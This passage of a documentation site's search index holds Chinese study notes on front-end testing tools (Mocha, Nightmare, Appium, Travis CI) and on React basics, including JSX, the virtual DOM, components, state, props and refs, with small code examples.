<li>TDD\uff1a\u57fa\u4e8e\u5f00\u53d1\u8005\u89d2\u5ea6\uff0c\u91cd\u70b9\u6d4b\u8bd5\u51fd\u6570\u7684\u8f93\u5165\u8f93\u51fa</li> <li>BDD\uff1a\u57fa\u4e8e\u4f7f\u7528\u8005\u89d2\u5ea6\uff0c\u91cd\u70b9\u6d4b\u8bd5\u5bf9\u7528\u6237\u884c\u4e3a\u7684\u53cd\u5e94</li> </ul> <p>\u6bd4\u5982\uff0c\u6709\u4e00\u4e2a\u8ba1\u6570\u5668\u51fd\u6570<code>counter</code>\uff0cTDD \u6d4b\u8bd5\u7684\u662f\u8f93\u51651\uff0c\u8f93\u51fa\u7684\u5e94\u8be5\u662f2\uff1bBDD \u6d4b\u8bd5\u7684\u662f\u7528\u6237\u8bbf\u95ee\u4ee5\u540e\uff0c\u8ba1\u6570\u5668\u5e94\u8be5\u589e\u52a0\u4e00\u6b21\u3002</p>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#mocha","title":"Mocha","text":"<p>Mocha \u662f\u76ee\u524d\u6700\u5e38\u7528\u7684\u6d4b\u8bd5\u6846\u67b6\u3002</p>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#_16","title":"\u529f\u80fd\u6d4b\u8bd5","text":"<p>\u529f\u80fd\u6d4b\u8bd5\u6307\u7684\u662f\uff0c\u7ad9\u5728\u5916\u90e8\u7528\u6237\u7684\u89d2\u5ea6\uff0c\u6d4b\u8bd5\u8f6f\u4ef6\u7684\u67d0\u9879\u529f\u80fd\u3002</p> <p>\u4e0e\u5185\u90e8\u4ee3\u7801\u5b9e\u73b0\u65e0\u5173\uff0c\u53ea\u6d4b\u8bd5\u529f\u80fd\u662f\u5426\u6b63\u5e38\u3002</p> <p>\u5f88\u591a\u65f6\u5019\uff0c\u5355\u5143\u6d4b\u8bd5\u90fd\u53ef\u4ee5\u901a\u8fc7\uff0c\u4f46\u662f\u6574\u4f53\u529f\u80fd\u4f1a\u5931\u8d25\u3002</p>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#_17","title":"\u524d\u7aef\u7684\u529f\u80fd\u6d4b\u8bd5","text":"<p>\u529f\u80fd\u6d4b\u8bd5\u5fc5\u987b\u5728\u771f\u6b63\u6d4f\u89c8\u5668\u505a\uff0c\u73b0\u5728\u6709\u56db\u79cd\u65b9\u6cd5\u3002</p> <ul> <li>\u4f7f\u7528\u672c\u673a\u5b89\u88c5\u7684\u6d4f\u89c8\u5668</li> <li>\u4f7f\u7528 Selenium Driver</li> <li>\u4f7f\u7528 Headless Chrome</li> <li>\u4f7f\u7528 Electron</li> </ul>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#nightmare","title":"Nightmare","text":"<ul> <li>\u4f7f\u7528 Electron \u6a21\u62df\u771f\u5b9e\u6d4f\u89c8\u5668\u73af\u5883</li> <li>\u63d0\u4f9b\u5927\u91cf\u4eba\u6027\u5316\u3001\u6613\u7528\u7684 API</li> <li>\u5b98\u7f51\uff1anightmarejs.org</li> </ul>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#_18","title":"\u79fb\u52a8\u5e73\u53f0\u7684\u81ea\u52a8\u5316\u6d4b\u8bd5","text":"<p>\u76ee\u524d\uff0c\u6700\u5e38\u89c1\u7684\u65b9\u6848\u662f\u4f7f\u7528 Appium\u3002</p> <ul> <li>\u57fa\u4e8e WebDriver</li> <li>\u91c7\u7528 \u5ba2\u6237\u7aef/\u670d\u52a1\u5668\u67b6\u6784</li> <li>\u53ef\u4ee5\u5728\u6a21\u62df\u5668\u8fd0\u884c\uff0c\u4e5f\u53ef\u4ee5\u5728\u771f\u673a\u8fd0\u884c</li> </ul>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#appium","title":"Appium \u6d4b\u8bd5\u6d41\u7a0b","text":"<ol> <li>WebDriver \u5ba2\u6237\u7aef\u53d1\u51fa\u6d4b\u8bd5\u8bf7\u6c42\u548c\u6d4b\u8bd5\u5185\u5bb9</li> <li>Appium \u670d\u52a1\u5668\u8f6c\u53d1\u5230\u76f8\u5e94\u7684\u6d4b\u8bd5\u8fd0\u884c\u5668\uff08Driver\uff09</li> <li>iOS \u8bbe\u5907\u662f UIAutomation\uff0c\u5b89\u5353\u8bbe\u5907\u662f UiAutomator</li> <li>\u6d4b\u8bd5\u8fd0\u884c\u5668\u5c06\u8fd0\u884c\u7ed3\u679c\uff0c\u8fd4\u56de\u7ed9 Appium</li> </ol>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#_19","title":"\u6301\u7eed\u96c6\u6210\u670d\u52a1\u5e73\u53f0","text":"<p>\u4ee3\u7801\u5408\u5e76\u8fdb\u4e3b\u5e72\u4ee5\u540e\uff0c\u5c31\u53ef\u4ee5\u8fdb\u884c==\u81ea\u52a8\u6784\u5efa\u548c\u53d1\u5e03==\u4e86\u3002</p> <p>\u7f51\u4e0a\u6709\u5f88\u591a PaaS \u5e73\u53f0\uff0c\u63d0\u4f9b\u6301\u7eed\u96c6\u6210\u670d\u52a1\u3002</p> <p>Travis CI \u5c31\u662f\u5176\u4e2d\u6700\u8457\u540d\u7684\u4e00\u4e2a\uff0c\u5b83\u53ef\u4ee5\u6839\u636e\u4f60\u63d0\u4f9b\u7684\u811a\u672c\uff0c\u81ea\u52a8\u5b8c\u6210\u6784\u5efa\u548c\u53d1\u5e03\u3002</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/","title":"React \u5168\u5bb6\u6876\u5165\u95e8\u6559\u7a0b 01","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 31197  \u9605\u8bfb63\u5206\u949f</p> <p>\u524d\u9762\u662f\u57fa\u7840\u8bfe\u7a0b\uff08\u96be\u5ea6\u5c0f\uff09\uff0c\u540e\u9762\u662f\u6848\u4f8b\uff0c\u8d28\u91cf\u8fd8\u53ef\u4ee5</p> <p>\u76ee\u7684</p> <ol> <li> <p>\u5de9\u56fareact\u57fa\u7840\u77e5\u8bc6\uff0c\u67e5\u6f0f\u8865\u7f3a\uff08\u719f\u6089\u7684\u90e8\u5206\u5feb\u8fdb\uff09</p> </li> <li> <p>\u5b66\u4e60\u76f8\u5173\u7684\u5e93\u7684\u4f7f\u7528</p> </li> </ol> <p>https://study.163.com/course/courseMain.htm?courseId=1210995818</p> <p>\u5171\u8ba1126\u8bfe\u65f6\uff0c2021\u5e741\u6708\u51fa\u54c1\uff0c\u5168\u90e8\u8bfe\u7a0b\u7ea638\u5c0f\u65f6</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#react","title":"\u7b2c\u4e00\u7ae0 React \u57fa\u7840","text":""},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#01-react","title":"01 react\u7b80\u4ecb","text":"<p>React \u662f\u6784\u5efa\u7528\u6237\u754c\u9762\u7684\u6846\u67b6\u3002</p> <p>\u524d\u7aef\u5de5\u4f5c\u5305\u62ec\uff1a\u53d1\u9001\u8bf7\u6c42\uff0c\u5904\u7406\u6570\u636e\uff0c\u5c55\u793a\u6570\u636e\uff08\u4f7f\u7528DOM\u5c55\u73b0\uff09\u3002</p> <ul> <li> <p>\u53d1\u51fa\u8bf7\u6c42\uff08ajax\uff09</p> </li> <li> <p>\u5904\u7406\u6570\u636e\uff08\u7b97\u6cd5\u4f18\u5316\uff0c\u8fc7\u6ee4\u6392\u5e8f\u7b97\u6cd5\uff09</p> </li> <li> <p>\u6e32\u67d3\u754c\u9762\uff08React \u5c06 JS \u6570\u636e\u6e32\u67d3\u6210 HTML \u89c6\u56fe\u7684\u5e93\uff09</p> </li> </ul> <p>React \u53ea\u5904\u7406\u5c55\u793a\u6570\u636e\uff08\u628a state \u8f6c\u6362\u6210 DOM\uff09\uff0c\u4e0d\u7ba1\u524d\u4e24\u90e8\u5206\u3002</p> <p>\u539f\u751f JS \u7f3a\u70b9\uff1a\u64cd\u4f5c DOM\u7e41\u7410\uff0c\u6027\u80fd\u8f83\u5dee\uff08JS \u76f4\u63a5\u64cd\u4f5c DOM\uff0c\u6d4f\u89c8\u5668\u8fdb\u884c\u5927\u91cf\u7684\u91cd\u6392\u91cd\u7ed8\uff0creflow and repaint\uff09\uff1bjQuery \u6bd4\u8f83\u91cd\uff0c\u4ee3\u7801\u91cf\u5f88\u5927\uff1b\u539f\u751fJS\u6ca1\u6709\u7ec4\u4ef6\u5316\u65b9\u6848\uff0c\u4ee3\u7801\u590d\u7528\u5f88\u4f4e\u3002</p> <p>React \u6846\u67b6\u4f18\u70b9\uff1a\u7ec4\u4ef6\u5316\uff08\u63d0\u9ad8\u7ec4\u4ef6\u590d\u7528\u7387\uff09\u3001\u58f0\u660e\u5f0f\u5f00\u53d1\uff1b\u4fbf\u4e8e ReactNative \u8fdb\u884c\u79fb\u52a8\u7aef\u5f00\u53d1\uff1b\u865a\u62df DOM \u548c Diff \u7b97\u6cd5\u9ad8\u6027\u80fd\u3002</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#02-hello-react","title":"02 hello-react\u6848\u4f8b","text":"<ul> <li> <p>react.js React \u6838\u5fc3\u5e93</p> </li> <li> <p>React-dom.js React \u64cd\u4f5c DOM \u7684\u5e93</p> </li> <li> <p>babel.js \u628aES6\u8f6c\u6362\u6210ES5,\u628a JSX \u8f6c\u6362\u6210 JS \u7b49</p> </li> </ul> <p>\u6ce8\u610f</p> <ol> <li> <p>HTML \u5f15\u5165\u987a\u5e8f\u4e0d\u80fd\u9519</p> </li> <li> <p>Script \u8fd9\u4e2a type \uff08\u5b9e\u9645\u4e0a\u4e0d\u4f1a\u8fd9\u6837\u5199\uff09</p> </li> <li> <p>\u5185\u90e8\u662f JSX\uff0c\u4e0d\u9700\u8981\u52a0\u5f15\u53f7\uff08\u4e0d\u662f\u5b57\u7b26\u4e32 dom = '';\uff09</p> </li> </ol> <pre><code>&lt;script type=\"text/babel\"&gt;\n  let dom = &lt;div&gt;&lt;/div&gt;;\n&lt;/script&gt;\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#03-dom","title":"03 \u865a\u62dfDOM\u7684\u4e24\u79cd\u521b\u5efa\u65b9\u5f0f","text":"<p>\u521b\u5efa\u865a\u62df DOM\uff0c\u53ef\u4ee5\u4f7f\u7528 JSX \u5b57\u9762\u91cf\uff08\u4f18\u5148\uff09\uff0c\u6216\u8005\u4f7f\u7528 React API \u521b\u5efa\u3002</p> <pre><code>const VDOM = React.createElement('h1', {id: 'test'}, 'Hi');\nReactDOM.render(VDOM, document.getElementById('root'));\n\nconst vDOM2 = &lt;div&gt;&lt;/div&gt;;\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#04-domdom","title":"04 \u865a\u62dfDOM\u4e0e\u771f\u5b9eDOM","text":"<p>\u865a\u62dfDOM\u5c31\u662f jsx \u8bed\u6cd5\u4e2d\u521b\u5efa\u7684\u865a\u62df DOM\uff0c\u771f\u5b9e DOM \u5c31\u662f\u539f\u751f JS \u521b\u5efa\u7684 DOM\u3002</p> <pre><code>let virtualDOM = &lt;div&gt;&lt;/div&gt;;\nlet trueDOM = document.getElementById('test');\n</code></pre> <p>\u865a\u62df DOM \u7279\u70b9\uff1a</p> <ol> <li> <p>\u672c\u8d28\u662f\u4e00\u4e2a\u5bf9\u8c61\uff08Object\uff09</p> </li> <li> <p>\u865a\u62dfDOM\u5c5e\u6027\u8f83\u5c11\uff0c\u771f\u5b9eDOM\u5c5e\u6027\u8f83\u591a\uff08\u4f8b\u5982\u5c3a\u5bf8\u548c\u6837\u5f0f\u76f8\u5173\u7684API\uff09\u56e0\u4e3a\u865a\u62dfDOM\u662f React \u5185\u90e8\u4f7f\u7528\uff0c\u6240\u4ee5\u4e0d\u9700\u8981\u771f\u5b9eDOM\u4e0a\u90a3\u4e48\u591a\u7684\u5c5e\u6027\u3002\u64cd\u4f5c\u865a\u62dfDOM\u4e5f\u66f4\u8f7b\u91cf\u5316\u3002</p> </li> <li> <p>\u6700\u7ec8 React \u4f1a\u628a\u865a\u62dfDOM\uff0c\u8f6c\u6362\u6210\u771f\u5b9eDOM\uff0c\u6e32\u67d3\u5230\u6d4f\u89c8\u5668\u4e2d\u3002</p> </li> </ol>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#05-jsx","title":"05 jsx\u8bed\u6cd5\u89c4\u5219","text":"<p>jsx\uff1ajavascript+XML \u6bd4\u4f20\u7edf\u7684 HTML \u4e25\u683c\uff0c\u4f8b\u5982\u6807\u7b7e\u5fc5\u987b\u95ed\u5408\uff1b\u4e0d\u80fd\u968f\u4fbf\u5199\u81ea\u5b9a\u4e49\u7684\u6807\u7b7e\u3002XML\u65e9\u671f\u7528\u4e8e\u524d\u540e\u7aef\u4f20\u9012\u6570\u636e\u7684\u683c\u5f0f\uff0c\u53ef\u4ee5\u4f7f\u7528XML\u6216\u8005JSON\uff08JSON \u53ef\u4ee5 parse stringify \u548c\u5b57\u7b26\u4e32\u8fdb\u884c\u8f6c\u6362\uff0c\u4e3b\u8981\u4f7f\u7528\u540e\u4e00\u79cd\u8fdb\u884c\u4f20\u8f93\uff09\u3002</p> <p>JSX \u8bed\u6cd5\u89c4\u5219</p> <ol> <li> <p>\u865a\u62dfDOM\u76f4\u63a5\u5199\u6807\u7b7eDIV\uff0c\u4e0d\u9700\u8981\u52a0\u5f15\u53f7\uff08\u4e0d\u662f\u5b57\u7b26\u4e32\uff09</p> </li> <li> <p>\u6807\u7b7eDIV\u5185\u7684 JS \u8868\u8fbe\u5f0f\u4f7f\u7528 \u5927\u62ec\u53f7 {}</p> </li> <li> <p>\u4f7f\u7528 className \u4ee3\u66ff class \u7c7b\u540d</p> </li> <li> <p>\u6837\u5f0f\u4f7f\u7528 style = {{padding: 100}}</p> </li> <li> <p>\u53ea\u80fd\u6709\u4e00\u4e2a\u6839\u6807\u7b7e</p> </li> <li> <p>\u6807\u7b7e\u5fc5\u987b\u95ed\u5408\uff08\u81ea\u95ed\u5408\u6216\u8005\u6210\u5bf9\uff09</p> </li> <li> <p>\u6807\u7b7e\uff1a\u5c0f\u5199\u5b57\u6bcd\u8868\u793aHTML\u6807\u7b7e\uff0c\u5927\u5199\u5b57\u6bcd\u5f00\u5934\u8868\u793a\u7ec4\u4ef6\uff08\u9700\u8981\u5f15\u5165\uff09\u5982\u679c\u6ca1\u6709HTML\u6807\u7b7e\u6216\u8005\u7ec4\u4ef6\uff0c\u90a3\u4e48react\u4f1a\u62a5\u9519\u3002</p> </li> </ol>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#06-jsx","title":"06 jsx\u5c0f\u7ec3\u4e60","text":"<p>JS \u8868\u8fbe\u5f0f\u662f\u4ec0\u4e48\uff1f\u548c JS \u8bed\u53e5\uff08\u4ee3\u7801\uff09\u4e0d\u4e00\u6837</p> <ul> <li> <p>\u8868\u8fbe\u5f0f\uff1a\u7b49\u53f7\u53f3\u4fa7\u7684\u662f\u8868\u8fbe\u5f0f\uff0c\u4e5f\u5c31\u662f\u8bf4\u8fd9\u4e00\u6bb5\u4ee3\u7801\u4f1a\u8f93\u51fa\u4e00\u4e2a\u7ed3\u679c\uff08a, a + b, foo(a, b), arr.map(), function test() {} \uff09\u90fd\u662f\u8868\u8fbe\u5f0f\u3002let a = \u8868\u8fbe\u5f0f;</p> </li> <li> <p>\u8bed\u53e5\uff1aif for while switch \u7b49\u8bed\u53e5\u7ed3\u6784\uff0c\u4e0d\u4f1a\u8fd4\u56de\u7ed3\u679c\uff0c\u8fd9\u90e8\u5206\u4e0d\u80fd\u5728 JSX \u4e2d\u4f7f\u7528</p> </li> </ul> <p>\u6240\u4ee5\uff0c\u4e09\u76ee\u8fd0\u7b97\u6cd5\u53ef\u4ee5\u4f7f\u7528\uff0cif \u5224\u65ad\u65e0\u6cd5\u4f7f\u7528</p> <pre><code>&lt;div&gt;\n  {\n    arr.map((item) =&gt; {\n      return (\n        &lt;span key={item.id}&gt;{item.value}&lt;/span&gt;\n      );\n    })\n  }\n&lt;/div&gt;\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#react_1","title":"\u7b2c\u4e8c\u7ae0 React \u9762\u5411\u7ec4\u4ef6\u7f16\u7a0b","text":""},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#07","title":"07 \u7ec4\u4ef6\u4e0e\u6a21\u5757","text":"<p>\u7ec4\u4ef6\uff1a\u754c\u9762\u4e2d\u67d0\u4e2a\u529f\u80fd\u5bf9\u5e94\u7684\u4ee3\u7801</p> <p>\u6a21\u5757\u5316\uff1b\u7ec4\u4ef6\u5316\uff1b\u5de5\u7a0b\u5316</p> <p>\u6a21\u5757\u5316\uff1aJS \u5c01\u88c5\u6210\u4e0d\u540c\u7684\u90e8\u5206\uff1b\u5927\u578b\u9879\u76ee\u62c6\u5206\u6210\u4e0d\u540c\u7684\u6a21\u5757\uff0c\u63d0\u9ad8\u590d\u7528\u6027</p> <p>\u7ec4\u4ef6\u5316\uff1aReact\u7ec4\u4ef6\u62c6\u5206\u6210\u4e0d\u540c\u7684\u90e8\u5206\uff08\u6839\u636e\u529f\u80fd\u62c6\u5206\uff09\uff0c\u62c6\u5206 JSX css JS \u7b49</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#08","title":"08 \u5f00\u53d1\u8005\u5de5\u5177\u7684\u5b89\u88c5","text":"<p>react \u5f00\u53d1\u8c03\u8bd5\u5de5\u5177\uff08Component \u53ef\u4ee5\u67e5\u770b\u7ec4\u4ef6\u5c42\u7ea7\u548c state props \u7b49\u5c5e\u6027\uff0cProfier \u67e5\u770b\u9875\u9762\u6027\u80fd\uff09</p> <p>profiler \u8bb0\u5f55\u7f51\u7ad9\u7684\u6027\u80fd\uff08\u52a0\u8f7d\u65f6\u95f4\uff09</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#09","title":"09 \u51fd\u6570\u5f0f\u7ec4\u4ef6","text":"<pre><code>function Demo() {\n  // console.log(this);\n  // \u5728\u51fd\u6570\u7ec4\u4ef6\u4e2d\uff0c\u7ecf\u8fc7babel\u7f16\u8bd1\u540e\uff0c\u662f\u4e25\u683c\u6a21\u5f0f\uff0c\u6240\u4ee5 this \u662f undefined\n  return &lt;span&gt;&lt;/span&gt;;\n}\n\nReactDOM.render(&lt;Demo/&gt;, document.getElementById('root'));\n\n// ReactDOM.render \u6267\u884c\u8fc7\u7a0b\n// 1. \u89e3\u6790\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u627e\u5230\u7ec4\u4ef6\u5b9a\u4e49 Demo\uff08\u51fd\u6570\u7ec4\u4ef6\uff09\n// 2. \u8c03\u7528 Demo \u51fd\u6570\uff0c\u5c06\u8fd4\u56de\u503c \u865a\u62df DOM \u8f6c\u6362\u6210\u771f\u5b9e DOM\n// 3. \u89e3\u6790\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u5c06\u771f\u5b9eDOM\u6e32\u67d3\u5230\u9875\u9762\u4e0a\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#10-es6","title":"10 ES6 \u7c7b\u548c\u7ee7\u627f","text":"<pre><code>class Person {\n  constructor(name, age) {\n    this.name = name;\n    this.age = age;\n  }\n  speak = () =&gt; {\n    console.log(this.name + String(this.age));\n  }\n}\n\nclass Student extends Person {\n  constructor(name, age, grade) {\n    super(name, age);\n    this.grade = grade;\n  }\n  speak = () =&gt; {\n    console.log(this.name + this.age + this.grade);\n  }\n}\n\nconst p1 = new Person('Bing', 10);\np1.speak();\n\nconst s1 = new Strudent(\"Andy\", 20, 3);\ns2.speak();\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#11","title":"11 \u7c7b\u7ec4\u4ef6\u7684\u7ee7\u627f","text":"<pre><code>class MyComponent extends React.Component {\n  render() {\n    return (\n      &lt;span&gt;test&lt;/span&gt;\n    );\n  }\n}\n\n// &lt;MyComponent /&gt;\n</code></pre> <p>\u9047\u5230\u6807\u7b7e\u540e\uff0cReact \u89e3\u6790\u5230\u662f\u4e00\u4e2a\u7c7b\uff0c\u6267\u884c new MyComponent \u521b\u5efa\u7c7b\u7684\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u8c03\u7528 render \u65b9\u6cd5\u8fd4\u56de\u865a\u62df DOM\uff0c\u7136\u540e\u6e32\u67d3\u5230\u9875\u9762\u4e0a\u4f5c\u4e3a\u771f\u5b9eDOM\u8282\u70b9\u3002</p> <p>2.2 state</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#12-14-state","title":"12-14 state \u5165\u95e8","text":"<p>state \u662f\u72b6\u6001\u673a\uff0c\u901a\u8fc7\u66f4\u65b0\u72b6\u6001\u9a71\u52a8\u9875\u9762\u66f4\u65b0</p> <pre><code>class Weather extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = {\n      isHot: false,\n    };\n  }\n  render() {\n    return (&lt;span&gt;&lt;/span&gt;);\n  }\n}\n</code></pre> <p>\u539f\u751f\u4e8b\u4ef6\u7ed1\u5b9a</p> <pre><code>let dom = document.getElementById('btn1');\ndom.addEventListener('click', () =&gt; {\n  console.log('click btn1');\n});\n\nlet dom2 = document.getElementById('btn2');\ndom2.onClick = () =&gt; {\n  console.log('click btn2');\n}\n</code></pre> <p>React \u4e2d\u901a\u5e38\u4e0d\u76f4\u63a5\u83b7\u53d6DOM</p> <pre><code>let dom = (&lt;div onClick={this.onClick}&gt;&lt;/div&gt;);\n\nonClick = (e) =&gt; {\n  console.log(1);\n}\n</code></pre> <p>\u200b</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#21-props","title":"21 \u4f7f\u7528\u5c55\u5f00\u8fd0\u7b97\u7b26\u6279\u91cf\u4f20\u9012 props","text":"<p>\u5c55\u5f00\u8fd0\u7b97\u7b26\u4f7f\u7528</p> <ul> <li> <p>\u53ef\u4ee5\u76f4\u63a5\u5c55\u5f00\u6570\u7ec4\uff08\u590d\u5236\u6570\u7ec4\uff09</p> </li> <li> <p>\u4e0d\u80fd\u76f4\u63a5\u5c55\u5f00\u5bf9\u8c61\uff1b\u5982\u679c\u662f React \u7ec4\u4ef6\u4e2d\u4f20 props \u53ef\u4ee5\u4f7f\u7528\u5c55\u5f00\u8fd0\u7b97\u7b26</p> </li> <li> <p>\u5728\u51fd\u6570\u4e2d\u53ef\u4ee5\u8868\u793a\u4e0d\u786e\u5b9a\u7684\u53c2\u6570\uff0c\u5b9e\u73b0\u5faa\u73af\u6216\u8005\u9012\u5f52\u8fd0\u7b97</p> </li> </ul> <pre><code>function sum(...numbers) {\n  return numbers.reduce((pre, curr) =&gt; {\n    return pre + curr;\n  }, 0);\n}\n\nsum(1,2,3,4);\n</code></pre> <pre><code>let obj = { name: 'a', age: 19 };\n\n// props \u8f83\u591a\u53ef\u4ee5\u8fd9\u6837\u5199\uff0c\u5927\u62ec\u53f7\u5e76\u4e0d\u662f\u5bf9\u8c61\uff0c\u662f jsx \u7684\u8bed\u6cd5\u7cd6\n&lt;MyComponent {...obj}/&gt;\n\n// console.log(...obj); \u4e0d\u80fd\u76f4\u63a5\u5c55\u5f00\u5bf9\u8c61\u6253\u5370\u5230\u539f\u751fJS\u4e2d\n</code></pre> <p>\u200b</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#24","title":"24 \u6784\u9020\u5668","text":"<p>constructor \u4e0d\u662f\u5fc5\u987b\u7684\uff0c\u4e3b\u8981\u7528\u4e8e\u58f0\u660e\u72b6\u6001\u548c\u7ed1\u5b9a\u51fd\u6570\uff08bind\uff09</p> <pre><code>constructor (props) {\n  super(props); // \u5b9e\u73b0\u7ee7\u627f\n  this.state = {\n    isFinished: false,\n  };\n  this.isChecked = React.createRef();\n  this.fn = this.fn.bind(this); // \u901a\u5e38\u4f7f\u7528\u7bad\u5934\u51fd\u6570\n}\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#25-props","title":"25 \u51fd\u6570\u5f0f\u7ec4\u4ef6\u4f7f\u7528 props","text":"<p>\u51fd\u6570\u5f0f\u7ec4\u4ef6\u53ef\u4ee5\u4f7f\u7528 props\uff0chook \u4e2d\u53ef\u4ee5\u4f7f\u7528 setEffect \u8bbe\u7f6e\u72b6\u6001\uff0c\u4e5f\u53ef\u4ee5\u9650\u5236\u6570\u636e\u7c7b\u578b\u3002</p> <pre><code>function Persion(props) {\n  const { name, age } = props;\n  return &lt;span&gt;{name}&lt;/span&gt;;\n}\n\nPerson.defaultProps = {\n  age: 20,\n};\n\n&lt;Person name={'Tom'} /&gt;\n</code></pre> <p>\u200b</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#27ref","title":"27\u5b57\u7b26\u4e32\u5f62\u5f0f\u7684ref","text":"<p>ref \u5728 react \u4e2d\uff0c\u5c31\u7c7b\u4f3c\u539f\u751f JS \u4e2d\u7684 ID\uff0c\u901a\u8fc7 ref \u53ef\u4ee5\u76f4\u63a5\u83b7\u53d6\u5230\u5bf9\u5e94\u7684 DOMS\u3002\u7ec4\u4ef6\u5185\u7684\u5143\u7d20\u53ef\u4ee5\u901a\u8fc7 ref \u6765\u6807\u8bc6\u81ea\u5df1\u3002ref \u521b\u5efa\u6709\u4e09\u79cd\u5f62\u5f0f\uff1a\u5b57\u7b26\u4e32\u5f62\u5f0f\u521b\u5efa\uff0c\u56de\u8c03\u51fd\u6570\u521b\u5efa\uff0ccreateRef \u521b\u5efa\u4e09\u79cd\u3002\u6700\u65b0 react \u63a8\u8350\u4f7f\u7528\u7b2c\u4e09\u79cd\u521b\u5efa refs\u3002</p> <p>\u4f7f\u7528\u5b57\u7b26\u4e32\u5f62\u5f0f\u521b\u5efa\uff1a\u521b\u5efa\u4f7f\u7528 ref=\"test\"\uff0c\u83b7\u53d6\u5c5e\u6027\u4f7f\u7528 this.refs 